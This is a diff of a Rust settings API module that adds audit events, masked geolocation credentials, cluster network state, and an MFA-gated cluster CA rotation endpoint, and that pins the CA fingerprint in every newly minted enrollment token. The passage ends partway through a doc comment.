@@ -2,6 +2,7 @@
 // SPDX-License-Identifier: MIT OR Apache-2.0
 
 use crate::disk_status::DiskSpaceCheckResult;
+use crate::service::preserve_provider_credential_proof;
 use crate::{ConfigService, EffectiveTelemetryPolicies};
 use axum::{
     extract::{Extension, State},
@@ -17,19 +18,22 @@ use std::sync::Arc;
 use temps_auth::{permission_guard, RequireAuth};
 use temps_core::error_builder::ErrorBuilder;
 use temps_core::{
-    problemdetails::Problem, AiChatLimitsSettings, AiConfigSettings, AppSettings, AuditContext,
-    AuditLogger, AuditOperation, BuildLimitsSettings, ClusterDnsSettings, ContainerLogSettings,
-    DiskSpaceAlertSettings, ImageRetentionSettings, LetsEncryptSettings, MetricsStoreKind,
-    MonitoringSettings, ObservabilityCompressionSettings, ObservabilityRetentionSettings,
-    PublicHostnameStrategy, RateLimitSettings, RequestMetadata, RequestTimeoutSettings,
-    ScreenshotSettings, SecurityHeadersSettings,
+    problemdetails::Problem, AiChatLimitsSettings, AiConfigSettings, AiWorkspaceFileLimitsSettings,
+    AppSettings, AuditContext, AuditLogger, AuditOperation, BuildLimitsSettings, CloudSettings,
+    ClusterDnsSettings, ContainerLogSettings, DiskSpaceAlertSettings, ImageRetentionSettings,
+    LetsEncryptSettings, MetricsStoreKind, MonitoringSettings, ObservabilityCompressionSettings,
+    ObservabilityRetentionSettings, PublicHostnameStrategy, RateLimitSettings, RequestMetadata,
+    RequestTimeoutSettings, ScreenshotSettings, SecurityHeadersSettings,
+    MAX_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR, MIN_CLOUD_TELEMETRY_BULK_ANOMALY_FACTOR,
 };
 use tracing::{error, info};
 use utoipa::{OpenApi, ToSchema};
 
 pub struct SettingsState {
     pub config_service: Arc<ConfigService>,
+    pub encryption_service: Arc<temps_core::EncryptionService>,
     pub audit_service: Arc<dyn AuditLogger>,
+    pub sensitive_action_authorizer: Arc<dyn temps_core::SensitiveActionAuthorizer>,
     pub route_table_refresher: Option<Arc<dyn temps_core::route_table::RouteTableRefresher>>,
     /// Node enrollment token minting/listing/revocation (ADR-020 WS-1.1).
     pub enrollment_token_service: Arc<crate::enrollment_tokens::EnrollmentTokenService>,
@@ -50,9 +54,178 @@ struct SettingsUpdatedAudit {
     context: AuditContext,
 }
 
+#[derive(Debug, Clone, serde::Serialize)]
+struct ClusterCaRotatedAudit {
+    context: AuditContext,
+    previous_fingerprint: String,
+    new_fingerprint: String,
+    revoked_enrollment_tokens: u64,
+}
+
+impl AuditOperation for ClusterCaRotatedAudit {
+    fn operation_type(&self) -> String {
+        "CLUSTER_CA_ROTATED".to_string()
+    }
+    fn user_id(&self) -> Option<i32> {
+        Some(self.context.user_id)
+    }
+    fn ip_address(&self) -> Option<String> {
+        self.context.ip_address.clone()
+    }
+    fn user_agent(&self) -> &str {
+        &self.context.user_agent
+    }
+    fn serialize(&self) -> anyhow::Result<String> {
+        serde_json::to_string(self)
+            .map_err(|error| anyhow::anyhow!("Failed to serialize audit operation {error}"))
+    }
+}
+
 impl AuditOperation for SettingsUpdatedAudit {
     fn operation_type(&self) -> String {
         "SETTINGS_UPDATED".to_string()
+    }
+    fn user_id(&self) -> Option<i32> {
+        Some(self.context.user_id)
+    }
+    fn ip_address(&self) -> Option<String> {
+        self.context.ip_address.clone()
+    }
+    fn user_agent(&self) -> &str {
+        &self.context.user_agent
+    }
+    fn serialize(&self) -> anyhow::Result<String> {
+        serde_json::to_string(self)
+            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
+    }
+}
+
+/// The two ADR-042 §6.3 bulk-activation guard settings, resolved to the values
+/// that would actually be **in effect**.
+///
+/// Effective rather than raw, for both of the jobs this type has. The
+/// permission bar must compare like with like — `None` and `Some(5.0)` are the
+/// same guard, and treating a client that omits the field as "widening from
+/// nothing" would refuse ordinary saves. And the audit record has to name the
+/// number that was really in force, because the point of writing it down is that
+/// somebody months later can say what this instance's spend guard was on a given
+/// day without also having to know which build's defaults applied.
+#[derive(Debug, Clone, Copy, PartialEq)]
+struct BulkActivationGuards {
+    anomaly_factor: f32,
+    rate_limit_spans_per_sec: Option<u32>,
+}
+
+impl From<&CloudSettings> for BulkActivationGuards {
+    fn from(cloud: &CloudSettings) -> Self {
+        Self {
+            anomaly_factor: cloud.effective_bulk_anomaly_factor(),
+            rate_limit_spans_per_sec: cloud.effective_bulk_rate_limit_spans_per_sec(),
+        }
+    }
+}
+
+/// `CLOUD_TELEMETRY_BULK_GUARD_UPDATED` — a change to one of ADR-042 §6.3's two
+/// bulk-activation guard settings, carrying the values on both sides.
+///
+/// A separate event from `SETTINGS_UPDATED`, which records only who saved and
+/// from where. That is enough for a presentation setting and not nearly enough
+/// for these two: widening the anomaly factor from 5× to 50× raises the ceiling
+/// on what a purchase-triggered activation may spend without any human
+/// confirming it, and under one undifferentiated `SETTINGS_UPDATED` row it is
+/// indistinguishable from somebody changing the instance's display name. An
+/// audit trail that cannot answer "when did this instance's spend guard change,
+/// and to what" is not an audit trail for a money guard.
+#[derive(Debug, Clone, serde::Serialize)]
+struct CloudTelemetryBulkGuardUpdatedAudit {
+    context: AuditContext,
+    previous_anomaly_factor: f32,
+    new_anomaly_factor: f32,
+    previous_rate_limit_spans_per_sec: Option<u32>,
+    new_rate_limit_spans_per_sec: Option<u32>,
+    /// Whether this change *loosened* the money guard — i.e. raised the anomaly
+    /// factor. Recorded as its own field so the one direction that matters is
+    /// greppable without a reader having to compare two floats themselves.
+    widened_anomaly_factor: bool,
+}
+
+impl AuditOperation for CloudTelemetryBulkGuardUpdatedAudit {
+    fn operation_type(&self) -> String {
+        "CLOUD_TELEMETRY_BULK_GUARD_UPDATED".to_string()
+    }
+    fn user_id(&self) -> Option<i32> {
+        Some(self.context.user_id)
+    }
+    fn ip_address(&self) -> Option<String> {
+        self.context.ip_address.clone()
+    }
+    fn user_agent(&self) -> &str {
+        &self.context.user_agent
+    }
+    fn serialize(&self) -> anyhow::Result<String> {
+        serde_json::to_string(self)
+            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
+    }
+}
+
+/// `FORWARDED_IP_TRUST_UPDATED` — a change to whether Temps trusts
+/// `X-Forwarded-For`/`X-Real-IP` from a loopback reverse proxy.
+///
+/// A separate event from `SETTINGS_UPDATED`, for the same reason as the bulk
+/// activation guard above: this toggle decides which IP address feeds
+/// analytics, proxy logs, and IP-based access-control decisions, so it must
+/// be distinguishable in the audit trail from an unrelated settings save.
+#[derive(Debug, Clone, serde::Serialize)]
+struct ForwardedIpTrustUpdatedAudit {
+    context: AuditContext,
+    previous_enabled: bool,
+    new_enabled: bool,
+}
+
+impl AuditOperation for ForwardedIpTrustUpdatedAudit {
+    fn operation_type(&self) -> String {
+        "FORWARDED_IP_TRUST_UPDATED".to_string()
+    }
+    fn user_id(&self) -> Option<i32> {
+        Some(self.context.user_id)
+    }
+    fn ip_address(&self) -> Option<String> {
+        self.context.ip_address.clone()
+    }
+    fn user_agent(&self) -> &str {
+        &self.context.user_agent
+    }
+    fn serialize(&self) -> anyhow::Result<String> {
+        serde_json::to_string(self)
+            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
+    }
+}
+
+/// `GEO_LICENSE_KEY_UPDATED` — the MaxMind license key was stored, rotated,
+/// or removed.
+///
+/// A separate event from `SETTINGS_UPDATED` for the same reason as the two
+/// above: this is a credential write. Storing or clearing it changes which
+/// third party this instance authenticates to and downloads geolocation data
+/// from, and under one undifferentiated `SETTINGS_UPDATED` row "somebody
+/// replaced the MaxMind credential" is indistinguishable from "somebody
+/// changed the refresh interval".
+///
+/// Booleans only. Neither the key nor its ciphertext is recorded — an audit
+/// trail is a long-lived, widely-readable store, and "a key was set" is the
+/// entire security-relevant fact.
+#[derive(Debug, Clone, serde::Serialize)]
+struct GeoLicenseKeyUpdatedAudit {
+    context: AuditContext,
+    /// A new key was submitted and encrypted (first save or a rotation).
+    key_set: bool,
+    /// The stored key was removed, reverting downloads to the bundled copy.
+    key_cleared: bool,
+}
+
+impl AuditOperation for GeoLicenseKeyUpdatedAudit {
+    fn operation_type(&self) -> String {
+        "GEO_LICENSE_KEY_UPDATED".to_string()
     }
     fn user_id(&self) -> Option<i32> {
         Some(self.context.user_id)
@@ -123,6 +296,8 @@ pub struct JoinTokenStatusResponse {
 /// Safe response for application settings that masks sensitive fields
 #[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
 pub struct AppSettingsResponse {
+    /// Consent for verified external-plugin installation count reporting.
+    pub plugin_installation_reporting_enabled: bool,
     // Core settings
     pub external_url: Option<String>,
     pub internal_url: Option<String>,
@@ -140,6 +315,9 @@ pub struct AppSettingsResponse {
     /// `{slug}-{env_slug}.{preview_domain}:{port}` URL before it's deployed.
     pub proxy_port: u16,
 
+    /// Managed control-plane destination and explicit export consent flags.
+    pub cloud: CloudSettings,
+
     // Screenshot settings
     pub screenshots: ScreenshotSettings,
 
@@ -152,9 +330,17 @@ pub struct AppSettingsResponse {
     // Security settings
     pub security_headers: SecurityHeadersSettings,
     pub rate_limiting: RateLimitSettings,
+    /// Database-backed opt-in; this is the sole control surface for every
+    /// proxy process, including a standalone `temps proxy`.
+    pub trust_loopback_forwarded_ip: bool,
 
     // Docker registry settings with masked password
     pub docker_registry: DockerRegistrySettingsMasked,
+
+    /// Prefix applied to implicit Docker Hub base images in generated
+    /// Dockerfiles (e.g. autopack's `FROM node:22-slim`). No sensitive
+    /// content, passed through as-is. `None`/empty disables rewriting.
+    pub registry_mirror_prefix: Option<String>,
 
     // Monitoring settings
     pub disk_space_alert: DiskSpaceAlertSettings,
@@ -186,6 +372,10 @@ pub struct AppSettingsResponse {
 
     /// Retention windows for raw proxy logs and OpenTelemetry data.
     pub observability_retention: ObservabilityRetentionSettings,
+
+    /// Geolocation refresh policy and freshness, with the MaxMind license key
+    /// reported only as a boolean.
+    pub geo: GeoSettingsMasked,
 
     /// The storage backend the runtime is **actually** using for metrics,
     /// after reconciling the `monitoring.store` toggle with the server's
@@ -224,6 +414,8 @@ pub struct AppSettingsResponse {
 
     /// Per-turn limits for the AI chat. No sensitive content.
     pub ai_chat_limits: AiChatLimitsSettings,
+    /// Persistent AI workspace file transfer and preview limits.
+    pub ai_workspace_file_limits: AiWorkspaceFileLimitsSettings,
     /// Upstream request/connection timeouts (hard ceiling + defaults) applied
     /// by the proxy to customer app traffic. No sensitive content.
     pub request_timeouts: RequestTimeoutSettings,
@@ -245,6 +437,58 @@ pub struct AppSettingsResponse {
     /// MCP (Model Context Protocol) server toggle (ADR-039). No sensitive
     /// content — passed through as-is so the settings UI can show and edit it.
     pub mcp_server: temps_core::McpServerSettings,
+}
+
+/// Geolocation settings with the MaxMind license key masked.
+///
+/// The stored value is AES-256-GCM ciphertext, and neither it nor the
+/// plaintext is ever returned: the UI only needs to know whether a key is
+/// saved, so it can render the "leave blank to keep current" affordance the
+/// email-provider credentials use. The refresh metadata below is reported
+/// read-only — it is written by the refresh job, not by a settings save.
+#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
+pub struct GeoSettingsMasked {
+    /// `null` means the effective default (24 hours).
+    pub refresh_interval_hours: Option<u32>,
+    /// `null` means the effective default (30 days).
+    pub stale_lookup_days: Option<u32>,
+    /// Refresh cadence actually applied, with defaults and bounds resolved.
+    pub effective_refresh_interval_hours: u32,
+    /// Staleness window actually applied, with defaults and bounds resolved.
+    pub effective_stale_lookup_days: u32,
+    /// True when a MaxMind license key is stored. The key is never returned.
+    pub maxmind_license_key_saved: bool,
+    /// When new database bytes were last installed (ISO 8601, UTC).
+    pub last_refreshed_at: Option<String>,
+    /// `maxmind_official` or `bundled_github`.
+    pub source: Option<String>,
+    /// When a refresh was last attempted, successful or not (ISO 8601, UTC).
+    pub last_check_at: Option<String>,
+    /// `ok` or `error` for the most recent refresh attempt.
+    pub last_check_status: Option<String>,
+    /// Redacted reason the last refresh failed. Never contains the key.
+    pub last_error: Option<String>,
+}
+
+impl From<temps_core::GeoSettings> for GeoSettingsMasked {
+    fn from(geo: temps_core::GeoSettings) -> Self {
+        Self {
+            refresh_interval_hours: geo.refresh_interval_hours,
+            stale_lookup_days: geo.stale_lookup_days,
+            effective_refresh_interval_hours: geo.effective_refresh_interval_hours(),
+            effective_stale_lookup_days: geo.effective_stale_lookup_days(),
+            maxmind_license_key_saved: geo.license_key_configured(),
+            last_refreshed_at: geo.last_refreshed_at.map(iso8601),
+            source: geo.source,
+            last_check_at: geo.last_check_at.map(iso8601),
+            last_check_status: geo.last_check_status,
+            last_error: geo.last_error,
+        }
+    }
+}
+
+fn iso8601(value: chrono::DateTime<chrono::Utc>) -> String {
+    value.to_rfc3339_opts(chrono::SecondsFormat::Secs, true)
 }
 
 /// Monitoring settings with the ClickHouse DSN masked.
@@ -333,10 +577,27 @@ pub struct MultiNodeSettingsMasked {
     /// SHA-256 fingerprint of the cluster CA certificate (public — operators can
     /// verify it out of band; the CA private key is never exposed).
     pub cluster_ca_fingerprint: Option<String>,
+    /// Effective cluster-wide container address pool. `None` only when the
+    /// singleton network configuration could not be read.
+    pub cluster_network: Option<ClusterNetworkSettings>,
     /// Node resource-alert thresholds (percent); `None` = that alert disabled.
     pub node_cpu_alert_percent: Option<f64>,
     pub node_memory_alert_percent: Option<f64>,
     pub node_disk_alert_percent: Option<f64>,
+    /// Seconds without a heartbeat before a node's workloads are failed over;
+    /// `None` = automatic failover disabled.
+    pub node_failover_after_secs: Option<u64>,
+}
+
+/// Read-only cluster network state. Pool changes are performed on the control
+/// plane through `temps network setup-multi-node`, which enforces that no
+/// existing node allocation can be stranded by an in-place edit.
+#[derive(Debug, Clone, Serialize, Deserialize, ToSchema, PartialEq, Eq)]
+pub struct ClusterNetworkSettings {
+    pub compute_pool_cidr: String,
+    pub subnet_prefix_len: u8,
+    pub allocation_count: u64,
+    pub locked: bool,
 }
 
 /// DNS provider settings with masked sensitive fields
@@ -362,7 +623,9 @@ impl From<AppSettings> for AppSettingsResponse {
         // Resolved before the literal below starts moving fields out of
         // `settings`; absence means "never configured", which reads as default.
         let self_update = settings.self_update();
+        let trust_loopback_forwarded_ip = settings.trust_loopback_forwarded_ip();
         Self {
+            plugin_installation_reporting_enabled: settings.plugin_installation_reporting_enabled,
             external_url: settings.external_url,
             internal_url: settings.internal_url,
             preview_domain: settings.preview_domain,
@@ -374,6 +637,7 @@ impl From<AppSettings> for AppSettingsResponse {
             // own fallback so an un-reconciled response is never worse than
             // that.
             proxy_port: 8080,
+            cloud: settings.cloud,
             screenshots: settings.screenshots,
             letsencrypt: settings.letsencrypt,
             dns_provider: DnsProviderSettingsMasked {
@@ -386,6 +650,7 @@ impl From<AppSettings> for AppSettingsResponse {
             },
             security_headers: settings.security_headers,
             rate_limiting: settings.rate_limiting,
+            trust_loopback_forwarded_ip,
             docker_registry: DockerRegistrySettingsMasked {
                 enabled: settings.docker_registry.enabled,
                 registry_url: settings.docker_registry.registry_url,
@@ -398,6 +663,7 @@ impl From<AppSettings> for AppSettingsResponse {
                 tls_verify: settings.docker_registry.tls_verify,
                 ca_certificate: settings.docker_registry.ca_certificate,
             },
+            registry_mirror_prefix: settings.registry_mirror_prefix,
             disk_space_alert: settings.disk_space_alert,
             container_logs: settings.container_logs,
             agent_sandbox: AgentSandboxSettingsMasked {
@@ -413,7 +679,13 @@ impl From<AppSettings> for AppSettingsResponse {
                                 auth_type: cfg.auth_type,
                                 credential_saved: cfg.credentials_encrypted.is_some(),
                                 default_model: cfg.default_model,
-                                extra: cfg.extra,
+                                extra: {
+                                    let mut extra = cfg.extra;
+                                    if let Some(object) = extra.as_object_mut() {
+                                        object.remove("credential_verified");
+                                    }
+                                    extra
+                                },
                             },
                         )
                     })
@@ -447,9 +719,11 @@ impl From<AppSettings> for AppSettingsResponse {
                     .cluster_ca_cert_pem
                     .as_deref()
                     .and_then(|pem| temps_core::node_pki::ca_fingerprint_sha256(pem).ok()),
+                cluster_network: None,
                 node_cpu_alert_percent: settings.multi_node.node_cpu_alert_percent,
                 node_memory_alert_percent: settings.multi_node.node_memory_alert_percent,
                 node_disk_alert_percent: settings.multi_node.node_disk_alert_percent,
+                node_failover_after_secs: settings.multi_node.node_failover_after_secs,
                 private_address: settings.multi_node.private_address,
             },
             // `effective_metrics_store` defaults to the configured store here;
@@ -461,12 +735,14 @@ impl From<AppSettings> for AppSettingsResponse {
             monitored_services_count: None,
             observability_compression: settings.observability_compression,
             observability_retention: settings.observability_retention,
+            geo: GeoSettingsMasked::from(settings.geo),
             insecure_tls: settings.insecure_tls,
             setup_complete: settings.setup_complete,
             require_mfa_for_admins: settings.require_mfa_for_admins,
             cluster_dns: settings.cluster_dns,
             build_limits: settings.build_limits,
             ai_chat_limits: settings.ai_chat_limits,
+            ai_workspace_file_limits: settings.ai_workspace_file_limits,
             request_timeouts: settings.request_timeouts,
             connection_limits: settings.connection_limits,
             tenant_resource_ceilings: settings.tenant_resource_ceilings,
@@ -478,6 +754,16 @@ impl From<AppSettings> for AppSettingsResponse {
 }
 
 impl AppSettingsResponse {
+    fn with_cluster_network_state(mut self, state: Option<crate::ClusterNetworkState>) -> Self {
+        self.multi_node.cluster_network = state.map(|state| ClusterNetworkSettings {
+            compute_pool_cidr: state.compute_pool_cidr,
+            subnet_prefix_len: state.subnet_prefix_len,
+            allocation_count: state.allocation_count,
+            locked: state.allocation_count > 0,
+        });
+        self
+    }
+
     /// Reconcile `effective_metrics_store` with the server's ClickHouse
     /// configuration. The runtime only uses ClickHouse when both the
     /// `monitoring.store` toggle is `click_house` AND all `TEMPS_CLICKHOUSE_*`
@@ -570,6 +856,7 @@ impl AppSettingsResponse {
         mint_enrollment_token,
         list_enrollment_tokens,
         revoke_enrollment_token,
+        rotate_cluster_ca,
         refresh_route_table,
     ),
     components(schemas(
@@ -580,6 +867,7 @@ impl AppSettingsResponse {
         crate::disk_status::DiskSpaceCheckResult,
         ContainerLogSettings,
         ClusterDnsSettings,
+        CloudSettings,
         PublicHostnameStrategy,
         DnsProviderSettingsMasked,
         DockerRegistrySettingsMasked,
@@ -598,6 +886,8 @@ impl AppSettingsResponse {
         MintEnrollmentTokenResponse,
         EnrollmentTokenInfo,
         EnrollmentTokenListResponse,
+        RotateClusterCaRequest,
+        RotateClusterCaResponse,
         RouteRefreshResponse,
         UpdateStatusResponse,
         UpdateCapabilityResponse,
@@ -646,6 +936,7 @@ pub fn configure_routes() -> Router<Arc<SettingsState>> {
             "/settings/enrollment-tokens/{id}",
             delete(revoke_enrollment_token),
         )
+        .route("/settings/cluster-ca/rotate", post(rotate_cluster_ca))
         .route("/settings/routes/refresh", post(refresh_route_table))
 }
 
@@ -690,8 +981,8 @@ pub struct MintEnrollmentTokenResponse {
     pub token: String,
     pub expires_at: String,
     pub max_uses: i32,
-    /// SHA-256 fingerprint of the cluster CA (if mTLS is set up). Pass it to the
-    /// worker as `temps join --ca-fingerprint <fp>` to verify the CA on join.
+    /// SHA-256 fingerprint of the cluster CA. Token issuance initializes the
+    /// CA when needed, so every newly minted token carries a trust pin.
     pub ca_fingerprint: Option<String>,
     pub message: String,
 }
@@ -709,6 +1000,172 @@ pub struct EnrollmentTokenInfo {
 #[derive(Debug, Serialize, ToSchema)]
 pub struct EnrollmentTokenListResponse {
     pub tokens: Vec<EnrollmentTokenInfo>,
+}
+
+#[derive(Debug, Deserialize, ToSchema)]
+pub struct RotateClusterCaRequest {
+    /// Fingerprint observed through a trusted operator channel immediately
+    /// before rotation. The request fails if the active root changed.
+    pub expected_fingerprint: String,
+    /// Destructive-action guard. Must be exactly `ROTATE CLUSTER CA`.
+    pub confirmation: String,
+}
+
+#[derive(Debug, Serialize, ToSchema)]
+pub struct RotateClusterCaResponse {
+    pub previous_fingerprint: String,
+    pub new_fingerprint: String,
+    pub revoked_enrollment_tokens: u64,
+    pub message: String,
+}
+
+/// Replace a compromised cluster CA and invalidate outstanding enrollment
+/// tokens. Existing workers fail closed until they are re-enrolled.
+#[utoipa::path(
+    tag = "Settings",
+    post,
+    path = "/settings/cluster-ca/rotate",
+    request_body = RotateClusterCaRequest,
+    responses(
+        (status = 200, description = "Cluster CA rotated", body = RotateClusterCaResponse),
+        (status = 400, description = "Invalid confirmation or CA state"),
+        (status = 401, description = "Unauthorized"),
+        (status = 403, description = "Insufficient permissions"),
+        (status = 409, description = "Expected fingerprint is stale"),
+        (status = 428, description = "Fresh MFA verification required"),
+        (status = 500, description = "Internal server error")
+    ),
+    security(("bearer_auth" = []))
+)]
+async fn rotate_cluster_ca(
+    RequireAuth(auth): RequireAuth,
+    State(app_state): State<Arc<SettingsState>>,
+    Extension(metadata): Extension<RequestMetadata>,
+    Json(req): Json<RotateClusterCaRequest>,
+) -> Result<impl IntoResponse, Problem> {
+    permission_guard!(auth, SettingsWrite);
+    permission_guard!(auth, ClusterCaRotate);
+
+    require_cluster_ca_rotation_authorization(
+        app_state.sensitive_action_authorizer.as_ref(),
+        &auth,
+    )
+    .await?;
+
+    if req.confirmation != "ROTATE CLUSTER CA" {
+        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
+            .title("Confirmation Required")
+            .detail("confirmation must be exactly ROTATE CLUSTER CA")
+            .build());
+    }
+
+    let (replacement, result) = crate::cluster_ca::rotate_cluster_ca(
+        &app_state.config_service,
+        &app_state.encryption_service,
+        req.expected_fingerprint.trim(),
+    )
+    .await
+    .map_err(|error| {
+        use crate::cluster_ca::ClusterCaError;
+        use crate::ConfigServiceError;
+        match error {
+            ClusterCaError::Settings(ConfigServiceError::ClusterCaFingerprintMismatch) => {
+                ErrorBuilder::new(StatusCode::CONFLICT)
+                    .title("Cluster CA Changed")
+                    .detail("The active cluster CA no longer matches expected_fingerprint. Read the current fingerprint through a trusted channel before retrying.")
+                    .build()
+            }
+            ClusterCaError::Settings(ConfigServiceError::ClusterCaNotInitialized) => {
+                ErrorBuilder::new(StatusCode::BAD_REQUEST)
+                    .title("Cluster CA Not Initialized")
+                    .detail("Mint an enrollment token to initialize the cluster CA before rotating it.")
+                    .build()
+            }
+            ClusterCaError::Settings(ConfigServiceError::InvalidConfiguration { .. }) => {
+                error!(%error, "Refused cluster CA rotation from an incomplete or invalid state");
+                ErrorBuilder::new(StatusCode::BAD_REQUEST)
+                    .title("Invalid Cluster CA State")
+                    .detail("The active cluster CA state is incomplete or invalid. Check the server logs and restore the control-plane settings backup before retrying.")
+                    .build()
+            }
+            error => {
+                error!(%error, "Failed to rotate cluster CA");
+                ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+                    .title("Cluster CA Rotation Failed")
+                    .detail("The cluster CA was not rotated. Check the server logs for details.")
+                    .build()
+            }
+        }
+    })?;
+    let new_fingerprint = temps_core::node_pki::ca_fingerprint_sha256(&replacement.cert_pem)
+        .map_err(|error| {
+            error!(%error, "Failed to fingerprint newly committed cluster CA");
+            ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+                .title("Cluster CA Rotation Incomplete")
+                .detail("The new CA was committed but its fingerprint response could not be generated. Read the current fingerprint from authenticated settings before re-enrolling workers.")
+                .build()
+        })?;
+
+    let audit = ClusterCaRotatedAudit {
+        context: AuditContext {
+            user_id: auth.user_id(),
+            ip_address: Some(metadata.ip_address.clone()),
+            user_agent: metadata.user_agent.clone(),
+        },
+        previous_fingerprint: result.previous_fingerprint.clone(),
+        new_fingerprint: new_fingerprint.clone(),
+        revoked_enrollment_tokens: result.revoked_enrollment_tokens,
+    };
+    if let Err(error) = app_state.audit_service.create_audit_log(&audit).await {
+        tracing::error!(%error, "Failed to record cluster CA rotation audit log");
+    }
+
+    Ok(Json(RotateClusterCaResponse {
+        previous_fingerprint: result.previous_fingerprint,
+        new_fingerprint,
+        revoked_enrollment_tokens: result.revoked_enrollment_tokens,
+        message: "Cluster CA rotated. Every worker must now be re-enrolled with a new single-use token and the new fingerprint.".to_string(),
+    }))
+}
+
+async fn require_cluster_ca_rotation_authorization(
+    authorizer: &dyn temps_core::SensitiveActionAuthorizer,
+    auth: &temps_auth::AuthContext,
+) -> Result<(), Problem> {
+    if !auth.is_session() || auth.session_id().is_none() {
+        return Err(ErrorBuilder::new(StatusCode::FORBIDDEN)
+            .title("Persisted Browser Session Required")
+            .detail("Cluster CA rotation cannot be performed with an API key, CLI token, deployment token, or non-persisted session. Sign in to the Temps console as an administrator.")
+            .value("error_code", "CLUSTER_CA_ROTATION_BROWSER_SESSION_REQUIRED")
+            .build());
+    }
+
+    if !auth.is_admin() {
+        return Err(ErrorBuilder::new(StatusCode::FORBIDDEN)
+            .title("Administrator Required")
+            .detail("Only a full Temps administrator may rotate the cluster CA. Platform administrators and delegated roles are not sufficient.")
+            .value("error_code", "CLUSTER_CA_ROTATION_ADMIN_REQUIRED")
+            .build());
+    }
+
+    let mfa_enabled = auth.user.as_ref().is_some_and(|user| user.mfa_enabled);
+    if !mfa_enabled {
+        return Err(ErrorBuilder::new(StatusCode::FORBIDDEN)
+            .title("MFA Enrollment Required")
+            .detail(
+                "Enroll an MFA method in account security settings before rotating the cluster CA.",
+            )
+            .value("error_code", "CLUSTER_CA_ROTATION_MFA_REQUIRED")
+            .value("setup_path", "/settings/security")
+            .build());
+    }
+
+    temps_auth::require_sensitive_action(
+        authorizer,
+        auth,
+        temps_core::SensitiveAction::RotateClusterCa,
+    )
+    .await
 }
 
 fn enrollment_error_to_problem(e: crate::enrollment_tokens::EnrollmentError) -> Problem {
@@ -760,21 +1217,30 @@ async fn mint_enrollment_token(
 ) -> Result<impl IntoResponse, Problem> {
     permission_guard!(auth, SettingsWrite);
 
-    // If a cluster CA already exists, embed its SHA-256 fingerprint so a joining
-    // node can verify the control plane's CA out of band (ADR-020 WS-2.2). The
-    // CA is minted lazily on the first mTLS enrollment, so the very first token
-    // may carry no fingerprint; subsequent tokens do.
-    let settings = app_state.config_service.get_settings().await.map_err(|e| {
+    // Initialize the cluster CA before minting the token. This makes the first
+    // enrollment as strongly pinned as every subsequent enrollment and avoids
+    // trust-on-first-use against the registration response.
+    let cluster_ca = crate::cluster_ca::ensure_cluster_ca(
+        &app_state.config_service,
+        &app_state.encryption_service,
+    )
+    .await
+    .map_err(|error| {
+        error!(%error, "Failed to initialize cluster CA before enrollment-token minting");
         ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
-            .title("Settings Error")
-            .detail(format!("Failed to read settings: {e}"))
+            .title("Cluster CA Initialization Failed")
+            .detail("The enrollment token was not created because the cluster trust root could not be initialized. Check the server logs for details.")
             .build()
     })?;
-    let ca_fingerprint = settings
-        .multi_node
-        .cluster_ca_cert_pem
-        .as_deref()
-        .and_then(|pem| temps_core::node_pki::ca_fingerprint_sha256(pem).ok());
+    let ca_fingerprint = Some(
+        temps_core::node_pki::ca_fingerprint_sha256(&cluster_ca.cert_pem).map_err(|error| {
+            error!(%error, "Failed to fingerprint initialized cluster CA");
+            ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
+                .title("Cluster CA Initialization Failed")
+                .detail("The enrollment token was not created because the cluster trust root could not be fingerprinted. Check the server logs for details.")
+                .build()
+        })?,
+    );
 
     let params = crate::enrollment_tokens::MintParams {
         max_uses: req.max_uses.unwrap_or(1),
@@ -1353,10 +1819,11 @@ async fn get_settings(
 ) -> Result<impl IntoResponse, Problem> {
     permission_guard!(auth, SettingsRead);
 
-    let (settings_result, policies_result, monitored_services_result) = tokio::join!(
+    let (settings_result, policies_result, monitored_services_result, cluster_network_result) = tokio::join!(
         app_state.config_service.get_settings(),
         app_state.config_service.get_effective_telemetry_policies(),
         app_state.config_service.count_monitored_services(),
+        app_state.config_service.get_cluster_network_state(),
     );
 
     match settings_result {
@@ -1380,9 +1847,18 @@ async fn get_settings(
                     );
                 })
                 .ok();
+            let cluster_network_state = cluster_network_result
+                .inspect_err(|error| {
+                    tracing::warn!(
+                        %error,
+                        "Failed to read cluster network state; CIDR controls are unavailable"
+                    );
+                })
+                .ok();
             let response = AppSettingsResponse::from(settings)
                 .with_effective_store(app_state.config_service.is_clickhouse_enabled())
                 .with_effective_timescale_state(policies, monitored_services_count)
+                .with_cluster_network_state(cluster_network_state)
                 .with_proxy_port(app_state.config_service.proxy_port());
             Ok(Json(response))
         }
@@ -1462,6 +1938,161 @@ fn preserve_omitted_security_fields(incoming: &mut AppSettings, current: &AppSet
     if incoming.self_update.is_none() {
         incoming.self_update = current.self_update.clone();
     }
+    if incoming.trust_loopback_forwarded_ip.is_none() {
+        incoming.trust_loopback_forwarded_ip = current.trust_loopback_forwarded_ip;
+    }
+}
+
+fn discard_plugin_reporting_consent(body: &mut serde_json::Value) {
+    if let Some(object) = body.as_object_mut() {
+        object.remove("plugin_installation_reporting_enabled");
+    }
+}
+
+/// Which of the operator-tuned `cloud.*` keys a `PUT /settings` body actually
+/// carried.
+///
+/// `AppSettings` deserializes with `#[serde(default)]` at every level, so a body
+/// that never mentions `cloud` produces a `CloudSettings::default()` that is —
+/// once deserialization is done — indistinguishable from one where the client
+/// spelled every default out. That is the whole bug this type exists to fix: the
+/// console's own save has never sent a `cloud` block, so any unrelated settings
+/// save silently reset the ADR-041 outbox ceiling and both ADR-042 spend guards
+/// to their build-time defaults. Worse than the reset, an operator who had
+/// *narrowed* the anomaly factor also had their next unrelated save refused with
+/// a 403, because the guard authorization compares the incoming factor against
+/// the stored one and an absent field reads as "widen it back to 5x".
+///
+/// Absence is therefore read off the wire, once, *before* the body becomes an
+/// `AppSettings`. The obvious cheaper alternative — "if the value equals the
+/// default, treat it as absent" — cannot work here: three of these four fields
+/// have a non-sentinel default, so that rule makes the default unwritable. An
+/// operator who narrowed the factor to 2x could never put it back to 5x, and one
+/// who pointed `backend_url` at a staging Cloud could never point it home again.
+///
